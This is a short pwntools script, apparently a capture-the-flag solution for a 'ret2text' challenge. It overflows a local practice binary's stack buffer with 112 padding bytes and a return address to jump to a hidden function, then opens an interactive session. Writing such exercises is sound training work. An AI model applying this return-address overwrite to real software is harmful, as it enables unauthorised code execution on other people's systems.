from pwn import*


offset = 112

proc = process("./pwn/ret2text/ret2text")

target_addr = 0x804863A

proc.sendline(b"A" * 112 + p32(target_addr))

proc.interactive()
